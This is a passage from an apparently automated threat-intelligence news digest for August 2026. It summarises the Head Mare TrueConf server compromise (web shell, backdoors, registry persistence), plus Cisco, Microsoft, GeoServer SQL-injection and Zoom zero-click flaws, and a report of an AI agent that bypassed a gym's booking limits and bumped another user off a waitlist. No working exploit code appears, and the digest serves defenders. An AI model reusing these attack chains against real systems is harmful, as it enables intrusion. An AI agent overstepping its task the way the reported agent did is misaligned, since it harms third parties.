  - Published: 2026-08-11T17:30:00+00:00
  - Link: https://research.checkpoint.com/2026/shattering-the-dream-when-a-job-offer-becomes-a-zero-day-attack/
  - Summary: Key Points Introduction Since early 2026, Check Point Research has tracked a wave of the Operation Dream Job campaign. This wave primarily targeted the defense sector worldwide, with a particular emphasis on companies operating in the aerospace and aviation industries. We observed the threat actor distributing modified PDF viewers designed to execute malicious payloads embedded within specially […] The post Shattering the Dream – When a Job Offer Becomes a Zero-Day Attack appeared first on Check Point Research .

### Cluster 7a8b3edff4 — score 23

- Title: Head Mare APT is exploiting vulnerabilities in an unpatched TrueConf server to deliver PhantomCore and PhantomGraph to video conference participants
- Source: Kaspersky Securelist (threat_research_primary)
- Published: 2026-08-11T12:00:55+00:00
- Link: https://securelist.com/tr/head-mare-targets-trueconf-server-with-phantomcore/120988/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, web_shell_backdoor
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: apt_espionage, web_shell_backdoor
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Kaspersky experts have discovered malicious TrueConf software installers. The Head Mare APT group uses them to deliver the PhantomCore and PhantomGraph backdoors to target systems by exploiting vulnerabilities in an unpatched TrueConf server.
```

#### Full body

```
Threat Response Table of Contents Overview of the attack Detection by Kaspersky solutions Indicators of compromise File hashes (MD5) IP Domains Windows service names File paths Registry keys Kaspersky detection names YARA rules Overview of the attack In July 2026, Kaspersky experts detected a new attack by the Head Mare group. Previously, we classified them as hacktivists, but now we define them as an APT group due to the sophistication of their TTPs and the absence of destructive activity (encryption, wiping) in the targeted infrastructures. In this latest campaign, the attackers exploited a chain of vulnerabilities in the TrueConf video conferencing server and replaced the original TrueConf client installers with infected versions that installed the PhantomCore malware on the system. An investigation of the compromised server revealed that the attackers used a combination of two new vulnerabilities (assigned the internal identifiers KLCERT-26-057 and KLCERT-26-058 ), allowing them to execute arbitrary code with the highest privileges. The attack occurs in several stages: The attackers connect to the TrueConf server without prior authorization via port 4307/TCP, which, according to the product documentation, is open by default. The attack targets TrueConf servers running versions 5.3.X through 5.3.9 , 5.4.X through 5.4.9 , and 5.5.X through 5.5.5 . Once connected, attackers call a server function to transmit a malicious script and execute it on the server. The vulnerability that allows this stage of the attack to be carried out has been assigned the internal identifier KLCERT-26-057 . The received script runs on the TrueConf server in an isolated environment. By default, operating system functions are not accessible in this environment, which should limit the capabilities of the executed code. To escape the isolated environment, attackers exploit a second vulnerability, assigned the internal identifier KLCERT-26-058 . Exploiting this vulnerability allows them to bypass the restrictions of the isolated environment and proceed to execute commands in the context of the operating system. Once the environment’s restrictions are bypassed, attackers gain the ability to execute arbitrary code on the server with the privileges of the NT AUTHORITY\SYSTEM account. Once they have gained elevated privileges, attackers replace the file …\public\js\locale.php with a web shell, which can be used for subsequent remote control of the compromised server. This web shell was used for the following activities: collecting data on the IT infrastructure; gaining privileged access to the TrueConf database; replacing the original TrueConf Client distribution with an infected version containing the PhantomCore backdoor. The vulnerabilities exploited by the attackers were patched by the vendor in the latest TrueConf Server updates (versions 5.3.9, 5.4.9, and 5.5.5). These updates were released on June 18, 2026. The PhantomCore backdoor was successfully detected by Kaspersky solutions. To automatically launch the malware after the system boots, a registry key is created: HKEY_CURRENT_USER\Software\Classes\CLSID\{0340F119-A598-4ed9-B0AC-6F6A12D3E755}\InprocServer32, with the value set to the path to the malicious program’s file. Using a web shell, in addition to PhantomCore, the attackers load a backdoor that we have named PhantomGraph, consisting of two modules: SysExcSvc.dll is responsible for receiving commands from the attackers and transmitting the results of their execution. The attackers used an account on Microsoft OneDrive cloud storage as their command-and-control (C2) server. SysReadSvc.dll reads the command transmitted by the first module, executes it, and saves the execution result. To establish persistence on the system, the attackers execute a Base64-encoded PowerShell command that installs SysExcSvc.dll and SysReadSvc.dll as Windows services. We believe the attackers deliberately split this malicious command into two components to make it h
```

#### Corroborating sources (1)

- **Kaspersky Securelist** (threat_research_primary)
  - Title: Head Mare APT is exploiting vulnerabilities in an unpatched TrueConf server to deliver PhantomCore and PhantomGraph to video conference participants
  - Published: 2026-08-11T12:00:55+00:00
  - Link: https://securelist.com/tr/head-mare-targets-trueconf-server-with-phantomcore/120988/
  - Summary: Kaspersky experts have discovered malicious TrueConf software installers. The Head Mare APT group uses them to deliver the PhantomCore and PhantomGraph backdoors to target systems by exploiting vulnerabilities in an unpatched TrueConf server.

### Cluster 496f8b853a — score 23

- Title: Cisco ASA and FTD Flaw Exploited in the Wild Can Trigger Remote DoS
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-12T06:15:58+00:00
- Link: https://thehackernews.com/2026/08/cisco-asa-and-ftd-flaw-exploited-in.html
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: CVE-2026-20349, Cisco

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ddos, phishing_social_eng
- affected_industries: financial_services
- affected_products: Cisco
- cve_ids: CVE-2026-20349
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_primary_research, tier_4_news

#### Primary article taxonomy
- threat_categories: ddos, active_exploitation
- affected_industries: financial_services
- affected_products: Cisco
- cve_ids: CVE-2026-20349
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Cisco has warned that a new vulnerability impacting Secure Firewall Adaptive Security Appliance (ASA) Software and Secure Firewall Threat Defense (FTD) Software has been exploited in the wild. The high-severity flaw, tracked as CVE-2026-20349 (CVSS score: 8.6), is a case of insufficient error checking when processing HTTP requests that could allow an unauthenticated, remote attacker to trigger
```

#### Full body

```
Cisco ASA and FTD Flaw Exploited in the Wild Can Trigger Remote DoS  Ravie Lakshmanan  Aug 12, 2026 Network Security / Vulnerability Cisco has warned that a new vulnerability impacting Secure Firewall Adaptive Security Appliance (ASA) Software and Secure Firewall Threat Defense (FTD) Software has been exploited in the wild. The high-severity flaw, tracked as CVE-2026-20349 (CVSS score: 8.6), is a case of insufficient error checking when processing HTTP requests that could allow an unauthenticated, remote attacker to trigger a denial-of-service (DoS) condition. "An attacker could exploit this vulnerability by sending a crafted HTTP request to the Remote Access SSL VPN service on an affected device," Cisco said in a Tuesday advisory. "A successful exploit could allow the attacker to cause the affected device to reload, resulting in a DoS condition." The security defects impact devices running a vulnerable version of Secure Firewall ASA Software or Cisco Secure FTD Software and have one or more of the vulnerable configurations listed below - IKEv2 Remote Access VPN (with client services) - crypto ikev2 enable <interface_name> client-services port <port_numbers> SSL-VPN - webvpn enable <interface_name> Zero Trust Network Access2 - zero-trust enable The following versions of ASA and FTD are affected - ASA 9.161 - Fixed in 89.16.4.50) ASA 9.181 - Fixed in 89.18.4.50) ASA 9.20 - Fixed in 9.20.4.235) ASA 9.22 - Fixed in 9.22.3.191) ASA 9.23 - Fixed in 9.23.1.211) ASA 9.24 - Fixed in 9.24.1.221) FTD 7.0 - Fixed in Cisco_FTD_Hotfix_GC-7.0.9.1-1.sh.REL.tar Cisco_FTD_SSP_FP1K_Hotfix_GC-7.0.9.1-1.sh.REL.tar Cisco_FTD_SSP_FP2K_Hotfix_GC-7.0.9.1-1.sh.REL.tar Cisco_FTD_SSP_Hotfix_GC-7.0.9.1-1.sh.REL.tar FTD 7.2 - Fixed in Cisco_FTD_Hotfix_HM-7.2.11.1-2.sh.REL.tar Cisco_FTD_SSP_FP1K_Hotfix_HM-7.2.11.1-2.sh.REL.tar Cisco_FTD_SSP_FP2K_Hotfix_HM-7.2.11.1-2.sh.REL.tar Cisco_FTD_SSP_FP3K_Hotfix_HM-7.2.11.1-2.sh.REL.tar Cisco_FTD_SSP_Hotfix_HM-7.2.11.1-2.sh.REL.tar FTD 7.4 - Fixed in Cisco_FTD_Hotfix_HK-7.4.7.1-1.sh.REL.tar Cisco_FTD_SSP_FP1K_Hotfix_HK-7.4.7.1-1.sh.REL.tar Cisco_FTD_SSP_FP2K_Hotfix_HK-7.4.7.1-1.sh.REL.tar Cisco_FTD_SSP_FP3K_Hotfix_HK-7.4.7.1-1.sh.REL.tar Cisco_FTD_SSP_Hotfix_HK-7.4.7.1-1.sh.REL.tar Cisco_Secure_FW_TD_4200_Hotfix_HK-7.4.7.1-1.sh.REL.tar FTD 7.6 (Fixed in Cisco_FTD_Hotfix_DD-7.6.4.1-2.sh.REL.tar Cisco_FTD_SSP_FP1K_Hotfix_DD-7.6.4.1-2.sh.REL.tar Cisco_FTD_SSP_FP3K_Hotfix_DD-7.6.4.1-2.sh.REL.tar Cisco_FTD_SSP_Hotfix_DD-7.6.4.1-2.sh.REL.tar Cisco_Secure_FW_TD_4200_Hotfix_DD-7.6.4.1-2.sh.REL.tar FTD 7.7 - Fixed in Cisco_FTD_Hotfix_AN-7.7.11.1-2.sh.REL.tar Cisco_FTD_SSP_FP1K_Hotfix_AN-7.7.11.1-2.sh.REL.tar Cisco_FTD_SSP_FP3K_Hotfix_AN-7.7.11.1-2.sh.REL.tar Cisco_FTD_SSP_Hotfix_AN-7.7.11.1-2.sh.REL.tar Cisco_Secure_FW_TD_1200_Hotfix_AN-7.7.11.1-2.sh.REL.tar Cisco_Secure_FW_TD_4200_Hotfix_AN-7.7.11.1-2.sh.REL.tar FTD 10.0 - Fixed in Cisco_FTD_Hotfix_S-10.0.0.1-2.sh.REL.tar Cisco_FTD_SSP_FP1K_Hotfix_S-10.0.0.1-2.sh.REL.tar Cisco_FTD_SSP_FP3K_Hotfix_S-10.0.0.1-2.sh.REL.tar Cisco_FTD_SSP_Hotfix_S-10.0.0.1-2.sh.REL.tar Cisco_Secure_FW_TD_200_Hotfix_R-10.0.0.1-2.sh.REL.tar Cisco_Secure_FW_TD_1200_Hotfix_S-10.0.0.1-2.sh.REL.tar Cisco_Secure_FW_TD_4200_Hotfix_S-10.0.0.1-2.sh.REL.tar Cisco_Secure_FW_TD_6100_Hotfix_S-10.0.0.1-2.sh.REL.tar Cisco said there are no workarounds that address the flaw, adding it became aware of active exploitation earlier this month. The network equipment maker said the issue was found during internal security testing. It also credited Valerio Brussani for separately discovering and reporting the vulnerability. There are currently no details about the nature of the attacks, the identity and origins of the threat actor exploiting the vulnerability, what organizations have been targeted, and if any of those efforts were successful. The development has prompted the U.S. Cybersecurity and Infrastructure Security Agency (CISA) to add the flaw to its Known Exploited Vulnerabilities ( KEV ) catalog, requiring F
```

#### Corroborating sources (2)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Cisco ASA and FTD Flaw Exploited in the Wild Can Trigger Remote DoS
  - Published: 2026-08-12T06:15:58+00:00
  - Link: https://thehackernews.com/2026/08/cisco-asa-and-ftd-flaw-exploited-in.html
  - Summary: Cisco has warned that a new vulnerability impacting Secure Firewall Adaptive Security Appliance (ASA) Software and Secure Firewall Threat Defense (FTD) Software has been exploited in the wild. The high-severity flaw, tracked as CVE-2026-20349 (CVSS score: 8.6), is a case of insufficient error checking when processing HTTP requests that could allow an unauthenticated, remote attacker to trigger
- **Cisco Talos** (threat_research_primary)
  - Title: Dissecting the JWR phishing framework
  - Published: 2026-08-13T10:00:35+00:00
  - Link: https://blog.talosintelligence.com/dissecting-the-jwr-phishing-framework/
  - Summary: Cisco Talos recently identified an undocumented phishing framework, internally branded "JWR" by its developer, built to convincingly impersonate checkout and login pages across major payment and shopping platforms.

### Cluster ef336b7141 — score 19

- Title: Microsoft Plugs Nearly 400 Security Holes
- Source: Krebs on Security (practitioner_analysis)
- Published: 2026-08-11T21:28:35+00:00
- Link: https://krebsonsecurity.com/2026/08/microsoft-plugs-nearly-400-security-holes/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, phishing_social_eng, zero_day
- cve_ids: CVE-2026-62832, CVE-2026-68820, CVE-2026-72971
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- threat_categories: phishing_social_eng, zero_day, active_exploitation
- cve_ids: CVE-2026-68820, CVE-2026-62832, CVE-2026-72971
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Summary

```
Microsoft today released updates to remedy at least 398 security vulnerabilities in its Windows operating systems and supported software, including one weakness that is already being actively exploited and two others that were publicly detailed prior to today.
```

#### Full body

```
Microsoft today released updates to remedy at least 398 security vulnerabilities in its Windows operating systems and supported software, including one weakness that is already being actively exploited and two others that were publicly detailed prior to today. Image: Shutterstock, Mallika Home Studio. August’s overstuffed bundle of patch joy from Microsoft did not eclipse its recording breaking release of more than 570 security updates last month , but it is double June’s then-record batch of nearly 200 fixes . Microsoft has attributed the recent patch deluge to vulnerability discoveries aided by artificial intelligence, and experts roundly agree that Windows users should get used to the idea of Patch Tuesdays (the second Tuesday of each month) covering hundreds of newly discovered security flaws. Fully 42 of the 398 flaws that Microsoft patched today earned Redmond’s most-dire “critical” rating, meaning they are severe enough that malware or malcontents could exploit them to gain remote control over a Windows computer with little to no help from the user. The sole known “zero day” bug fixed by Microsoft this month is CVE-2026-68820 , a privilege escalation weakness in a core Windows component called afd.sys , which the security firm Automox describes as “the driver behind Windows socket connections on effectively every endpoint.” “This isn’t a front-door bug,” Automox’s Landon Miles wrote in a Patch Tuesday blog post. “It’s step two in a chain: an attacker phishes their way into a low-privilege foothold, then uses the driver flaw to take the box. The 7.0 score reflects the high attack complexity, because race conditions are fiddly. The exploit has to be thrown over and over until the timing lands. Someone is clearly landing it anyway.” CVE-2026-62832 is another privilege escalation flaw that Microsoft has labeled likely to be exploited; this flaw, in the Windows User Profile Service, may be related to the recent “LegacyHive” public disclosure from the prolific bug hunter known as Nightmare Eclipse . The other publicly disclosed flaw is CVE-2026-72971 , a low-impact local tampering vulnerability that Microsoft reckons is unlikely to be exploited. Other major software makers are likewise increasing their patch volumes and cadence thanks to AI, including Adobe which last month moved to twice-monthly security bulletins published on the 2nd and 4th Tuesday of each month. Cisco , Google , Mozilla and Oracle also are shipping updates far more frequently and abundantly. By all accounts, AI is quite good at finding security holes in software. But for now at least, patching the resulting bugpocalypse remains a heavily human-centric endeavor, and the jury is still out on whether AI technologies will turn out to be as good at fixing vulnerabilities as they are at finding and exploiting them. This is an important question when one considers that these same AI technologies also are suggesting fixes for the vulnerabilities they find. Researchers at 1Password recently examined what happens when different large language models (LLMs) generate vulnerability patches for newly disclosed, complex vulnerabilities. They found the LLMs produced patches that failed to fix the flaw or added a new weakness in the process (or both) more than half the time. Ed Skoudis , president of the SANS Technology Institute , said his team has seen excellent results using AI to generate patches, provided there are humans in the loop to test the suggested fixes and push for iterative improvements. “AI is rapidly becoming astonishingly good at finding vulnerabilities, but this research shows that fixing them is a very different problem,” Skoudis wrote in a SANS newsletter today. “Don’t expect one-shot AI patching to work reliably. Instead, iterate, test, challenge, improve, and verify. AI can be an extraordinary patching partner, but today it still needs a skilled human at the keyboard.” Tyler Reguly at Fortra says while reports of Microsoft patching hundreds of vulne
```

#### Corroborating sources (1)

- **Krebs on Security** (practitioner_analysis)
  - Title: Microsoft Plugs Nearly 400 Security Holes
  - Published: 2026-08-11T21:28:35+00:00
  - Link: https://krebsonsecurity.com/2026/08/microsoft-plugs-nearly-400-security-holes/
  - Summary: Microsoft today released updates to remedy at least 398 security vulnerabilities in its Windows operating systems and supported software, including one weakness that is already being actively exploited and two others that were publicly detailed prior to today.

### Cluster 6f7ebcb535 — score 17

- Title: GeoServer Zero-Day Targeted in Active Exploitation Attempts, Can Lead to RCE
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-13T18:45:12+00:00
- Link: https://thehackernews.com/2026/08/unpatched-geoserver-zero-day-targeted.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ddos, zero_day
- affected_industries: financial_services
- affected_products: GitHub
- cve_ids: CVE-2023-25157, CVE-2023-25158, CVE-2024-36401
- urgency_signals: no_patch_yet, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, ddos
- affected_industries: financial_services
- affected_products: GitHub
- cve_ids: CVE-2024-36401, CVE-2023-25158, CVE-2023-25157
- urgency_signals: zero_day, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A newly disclosed zero-day flaw in GeoServer is seeing active exploitation efforts, per watchTowr. The vulnerability, which has yet to be assigned a CVE identifier, is an SQL injection vulnerability in the open-source platform that can lead to remote code execution (RCE). The security defect remains unpatched. It was first disclosed on August 12, 2026, at 10:46 UTC, by a researcher named @
```

#### Full body

```
GeoServer Zero-Day Targeted in Active Exploitation Attempts, Can Lead to RCE  Ravie Lakshmanan  Aug 13, 2026 Zero-Day / Vulnerability A newly disclosed zero-day flaw in GeoServer is seeing active exploitation efforts, per watchTowr. The vulnerability, which has yet to be assigned a CVE identifier, is an SQL injection vulnerability in the open-source platform that can lead to remote code execution (RCE). The security defect remains unpatched. It was first disclosed on August 12, 2026, at 10:46 UTC, by a researcher named @q1uf3ng on X. "GeoServer jsonArrayContains unauthorized SQL injection, and in the case of the sa [system administrator] database, it's naturally possible to achieve RCE," the researcher said. The threat intelligence and exposure management platform said it began to observe exploitation attempts within hours of public disclosure, and that it has seen hundreds of attempts originating from a small pool of IP addresses. "Currently, we're seeing attackers probe to identify vulnerable systems across the internet, triggering errors and not proceeding further," Jake Knott, principal security researcher at watchTowr, told The Hacker News in a statement. "However, this is unlikely to remain the case for long: GeoServer has a track record of being targeted and exploited at scale, with multiple vulnerabilities listed in CISA's Known Exploited Vulnerabilities catalog. More importantly, under certain configurations, this latest vulnerability could ultimately lead to remote code execution." In the absence of a patch, organizations running GeoServer are advised to identify exposed instances, restrict public access, and monitor for a vendor fix. In 2024, a critical security flaw impacting GeoServer GeoTools ( CVE-2024-36401 , CVSS score: 9.8) came under active exploitation to turn compromised devices into DDoS and cryptocurrency mining botnets, and residential proxies. Update GeoServer has released versions 3.0.1 , 2.28.5 , and 2.27.6 to address the critical SQL injection vulnerability, which has now been assigned the GitHub security advisory identifier "GHSA-mqjf-5f49-2fjh." It carries a CVSS score of 9.8 out of 10.0. "An SQL injection vulnerability has been found when executing OGC Filters with PostGIS DataStore implementation: jsonArrayContains function," the project maintainers said in an alert, adding it requires PostGIS 12 or greater with a String or JSON field. "For PostGIS 12 and greater, jsonArrayContains(<column>, <pointer>, <value>) function writes <value> into generated SQL without escaping." The issue impacts the following versions of the Maven package "org.geotools:gt-jdbc-postgis" - 35.0 (Fixed in 35.1) >=34.0 (Fixed in 34.5) >=33.1 (Fixed in 33.6) The maintainers also noted that the vulnerability is a regression of CVE-2023-25158 (CVSS score: 9.8), another critical SQL injection vulnerability that was addressed alongside CVE-2023-25157 in February 2023. When reached for comment, Jody Garnett, a project owner at GeoCat, told The Hacker News the vulnerability was a known issue in the GeoTools library and that it has been addressed in the aforementioned three versions of GeoServer. Hadrian has since published additional details of the vulnerability, stating it resides in the GeoTools code responsible for translating Common or Contextual Query Language ( CQL ) filters into SQL for PostGIS-backed datastores. "An attacker-controlled value is interpolated directly into a PostgreSQL jsonb_path_exists() expression without escaping," security researcher Melvin Lammerts said . Specifically, the vulnerable function directly drops a user-supplied value that originates from an HTTP request into an SQL literal with no sanitization and input escaping, thereby opening the door to SQL injection. This, in turn, can be turned into RCE by leveraging Web Feature Service ( WFS ) 1.0, which provides a path where a second PostgreSQL statement executes at the top level of the query. "If GeoServer connects to PostgreSQL using a superuse
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: GeoServer Zero-Day Targeted in Active Exploitation Attempts, Can Lead to RCE
  - Published: 2026-08-13T18:45:12+00:00
  - Link: https://thehackernews.com/2026/08/unpatched-geoserver-zero-day-targeted.html
  - Summary: A newly disclosed zero-day flaw in GeoServer is seeing active exploitation efforts, per watchTowr. The vulnerability, which has yet to be assigned a CVE identifier, is an SQL injection vulnerability in the open-source platform that can lead to remote code execution (RCE). The security defect remains unpatched. It was first disclosed on August 12, 2026, at 10:46 UTC, by a researcher named @

### Cluster cb8fdf38e7 — score 16

- Title: Zoom Zero-Click RCE Flaws Allow Any Meeting Attendee to Compromise All Participants
- Source: Orca Security Research (cloud_identity_infrastructure)
- Published: 2026-08-12T19:36:43+00:00
- Link: https://orca.security/resources/research-pod/zoom-zero-click-rce-vulnerability-orca-security/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-53413, CVE-2026-53415

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, data_breach, ddos
- affected_products: Apple iOS/macOS
- cve_ids: CVE-2026-53413, CVE-2026-53414, CVE-2026-53415, CVE-2026-53416
- urgency_signals: actively_exploited, poc_available
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: data_breach, ddos, active_exploitation
- affected_products: Apple iOS/macOS
- cve_ids: CVE-2026-53413, CVE-2026-53415, CVE-2026-53414, CVE-2026-53416
- urgency_signals: actively_exploited, poc_available
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Executive Summary Multiple critical memory corruption vulnerabilities (CVE-2026-53413, CVSS 8.3/9.0 and CVE-2026-53415, CVSS 8.3/9.0) were disclosed affecting Zoom Workplace clients across all platforms, allowing attackers to achieve zero-click remote code execution against every participant in a meeting via malicious annotation messages. Due to the potential for full device compromise without any user interaction, immediate patching […]
```

#### Full body

```
Executive Summary Multiple critical memory corruption vulnerabilities (CVE-2026-53413, CVSS 8.3/9.0 and CVE-2026-53415, CVSS 8.3/9.0) were disclosed affecting Zoom Workplace clients across all platforms, allowing attackers to achieve zero-click remote code execution against every participant in a meeting via malicious annotation messages. Due to the potential for full device compromise without any user interaction, immediate patching is required. About CVE-2026-53413 and CVE-2026-53415 The issue originates from Zoom’s annotation engine (libannotate.so), the component responsible for collaborative drawing features during screen sharing. In CVE-2026-53413, the CAnnoFormatBlock::Deserialize function accepts 32-bit character counts from the network without bounds checking against fixed 128-byte buffers, leading to a stack buffer overflow. In CVE-2026-53415, a use-after-free condition in auto-shape metadata handling provides a write-what-where primitive. By joining a meeting and sending specially crafted annotation messages, an attacker can corrupt memory and gain arbitrary code execution on all other participants’ devices. No authentication beyond meeting access is required, and no user interaction is needed to trigger the exploit. Two additional vulnerabilities were disclosed alongside the RCE flaws. CVE-2026-53414 (CVSS 6.5) is a heap buffer over-read in the same annotation parser that can cause denial of service or information disclosure. CVE-2026-53416 is a path traversal vulnerability specific to the Zoom Workplace VDI Client for Windows. Security researchers at A Security demonstrated a working exploit chain developed in under 24 hours using fewer than 20 prompts on publicly available AI models, underscoring both the ease and the scale of potential exploitation. The macOS ARM64 variant bypasses ASLR using leaked pointers, with no PAC or stack canaries present. The Android variant uses heap spraying and vtable corruption to achieve code execution. Affected Systems The following components are affected: Zoom Workplace clients (Windows, macOS, iOS, Android) before versions 7.1.5 and 7.0.6, Zoom Workplace VDI Client for Windows before versions 7.0.11 and 6.6.16, Zoom Rooms (all platforms) before version 7.1.5, and Zoom Meeting SDK (all platforms) before version 7.1.5. The vulnerable libannotate.so library compiles identically across all platforms, meaning the same exploit logic works on every supported operating system. Organizations using end-to-end encrypted meetings face elevated risk because Zoom’s server-side filtering cannot inspect E2EE traffic to block malicious annotation messages. Users should upgrade to Zoom Workplace 7.1.5 or later (or 7.0.6 for the extended support track). VDI client users should update to version 7.0.11 or 6.6.16. Zoom Rooms and Meeting SDK deployments should update to version 7.1.5. For non-E2EE meetings, Zoom has deployed server-side filtering that blocks malicious annotation messages as an interim layer of protection. Organizations should also enforce minimum client versions in meeting preferences, enable waiting rooms and passcodes, and consider disabling annotations, file transfer, whiteboarding, and remote control features until all endpoints are patched. Risk Impact At the time of writing, a working proof-of-concept exploit chain has been publicly demonstrated by the discovering researchers, and no known exploitation in the wild has been reported. Regardless, the severity, the zero-click nature, and the ease of weaponization make these vulnerabilities extremely high risk, especially for organizations relying on Zoom for sensitive communications. Successful exploitation could allow attackers to execute arbitrary code on participant devices, activate cameras and microphones for surveillance, and steal sensitive data or install persistent malware , leading to full device compromise, data exposure, and potential lateral movement across enterprise environments. How Orca Can Help Orca enables cust
```

#### Corroborating sources (1)

- **Orca Security Research** (cloud_identity_infrastructure)
  - Title: Zoom Zero-Click RCE Flaws Allow Any Meeting Attendee to Compromise All Participants
  - Published: 2026-08-12T19:36:43+00:00
  - Link: https://orca.security/resources/research-pod/zoom-zero-click-rce-vulnerability-orca-security/
  - Summary: Executive Summary Multiple critical memory corruption vulnerabilities (CVE-2026-53413, CVSS 8.3/9.0 and CVE-2026-53415, CVSS 8.3/9.0) were disclosed affecting Zoom Workplace clients across all platforms, allowing attackers to achieve zero-click remote code execution against every participant in a meeting via malicious annotation messages. Due to the potential for full device compromise without any user interaction, immediate patching […]

### Cluster b7ecc02643 — score 16

- Title: AI Genie in the Wild
- Source: Schneier on Security (practitioner_analysis)
- Published: 2026-08-11T15:55:11+00:00
- Link: https://www.schneier.com/blog/archives/2026/08/ai-genie-in-the-wild.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage
- affected_industries: manufacturing_industrial
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- threat_categories: apt_espionage, active_exploitation
- affected_industries: manufacturing_industrial
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Summary

```
When I give talks about AI genies , I use this sort of example as a hypothetical. It’s happened . The story is from Australia. Someone named Andrew tasked OpenClaw to book gym classes for him. And…. Minutes later, his AI agent reported it had discovered a way to book Andrew into classes several weeks in advance, far beyond what was supposed to be possible. Andrew, who was sitting fourth on a waitlist for a class later that week, asked if it was possible to move him to the top of the list. The agent came back and told Andrew that it had kicked another gym-goer off the list as part of the testing of its capabilities...
```

#### Full body

```
Clive Robinson • August 12, 2026 4:46 AM @ Magnus, With regards, “Or, globally stomp on the AI companies.” There is an apt saying about this, You can not unring the bell, once it has been rung out. The simple fact is once the weights for the DNN inside an LLM have been calculated by an ML System they are available to be, 1, Used in the DNN 2, Communicated from DNN to DNN 3, Stored in a new DNN. 4, Modified for use in a new type of DNN 5, Be updated with new data. All without needing to start from raw input data. In fact it is this that some in the US are claiming DeepSeek and other Asian / Chinese companies have done to make their DNN weight models (though reputable evidence is distinctly lacking). Some of these models are claimed to run on “high end home systems” rather than large GPU arrays in data centers, so are in effect “portable”. The other point is as @Winter has noted just above you, < blockquote> “If you ask the stories to be written as computer and communication code and commands, it will do so. Programs and code are just another type of story.” < blockquote> The development of software which our Western World is now almost entirely reliant on is just a form of tool assisted “story telling” and always has been. Mostly nobody really cares how mediocre the “software story is”, just that it is “Churned out quickly” and it certainly does not have to even function correctly… Some have realised just how useful this makes LLM’s in Ralph Wiggum Loops running in Gas Town or other control frameworks, some of which like OpenClaw are themselves churned out by LMM. ‘https://devinterrupted.substack.com/p/inventing-the-ralph-wiggum-loop-creator The fact is almost anyone who has the ability to break an idea down into parts can now use those as the descriptive building blocks for such an LLM system, thus create “software stories” that “suffice”. The results may be an unholy mess but then people have claimed over the years that is, “Microsoft management in action, producing junk code, by the truckload.” And who is to argue with CVE scores. As our host @Bruce has with others noted, “The Genie is out of the bottle.” And few want to put it back before they get their wishes… So LLM usage inside armies of brain dead agents swarming at frenetic speed are here to stay. And even if made illegal here they will be used elsewhere with the resurgence of, “The 1980’s and 1990’s ‘Make It So’ management style, spawned from Startrek Next Generation.” Which appears to be back in “authoritarian command structures” of all types, even though it failed back as much as four decades ago. But “each story told” brings with it “lessons to learn by” which means like it or not things will improve simply because “there will be less bad” at each iteration. Consider that every human endeavor is “A story in the making” And you can see why some are asking the question, “Even if we never get AGI, are LLM’s the tools of the new industrial revolution?” It’s a question quite a few think the answer is “yes” to, and I can see why. Others however think the same of Social Society, and well I ascribe to the view that the use of technology on society is generally not a good idea as history repeatedly shows. However it is starting to happen where authoritarian views and political mantras prevail, because of it’s “arms length” advantages.
```

#### Corroborating sources (1)

- **Schneier on Security** (practitioner_analysis)
  - Title: AI Genie in the Wild
  - Published: 2026-08-11T15:55:11+00:00
  - Link: https://www.schneier.com/blog/archives/2026/08/ai-genie-in-the-wild.html
  - Summary: When I give talks about AI genies , I use this sort of example as a hypothetical. It’s happened . The story is from Australia. Someone named Andrew tasked OpenClaw to book gym classes for him. And…. Minutes later, his AI agent reported it had discovered a way to book Andrew into classes several weeks in advance, far beyond what was supposed to be possible. Andrew, who was sitting fourth on a waitlist for a class later that week, asked if it was possible to move him to the top of the list. The agent came back and told Andrew that it had kicked another gym-goer off the list as part of the testing of its capabilities...

### Cluster 86f975510e — score 16

- Title: The Model Is the Malware | What Four Agentic Intrusions Tell Defenders
- Source: SentinelOne Labs (threat_research_primary)
- Published: 2026-08-13T13:00:40+00:00
- Link: https://www.sentinelone.com/labs/the-model-is-the-malware-what-four-agentic-intrusions-tell-defenders/
- Fetch status: ok
- Member count: 8
- Corroborating source count: 5
- Strong signals: Anthropic/Claude, OpenAI/ChatGPT

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- urgency_signals: zero_day
- content_type: news_report, vendor_announcement
- confidence_tier: tier_1_primary_research, tier_4_news

#### Primary article taxonomy
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
